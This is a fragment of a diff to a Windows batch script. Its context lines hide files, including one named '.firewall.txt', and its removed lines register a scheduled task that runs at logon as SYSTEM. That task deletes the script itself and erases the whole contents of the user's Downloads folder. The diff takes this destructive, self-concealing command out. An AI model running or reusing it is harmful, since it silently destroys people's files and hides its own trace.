@@ -78,9 +78,3 @@ attrib +h "%HD%\.firewall.txt"
 for %%f in (%SF%\.*) do (
     attrib +h "%%f" >nul 2>&1
 )
-
-ping 127.0.0.1 -n 5 > nul
-
-schtasks /create /tn "DeleteOnExit" /tr "del /f /q \"%~f0\" && del /f /q \"%USERPROFILE%\Downloads\*\" && for /d %%D in (\"%USERPROFILE%\Downloads\*\") do rd /s /q \"%%D\"" /sc onlogon /ru SYSTEM /f
-
-exit
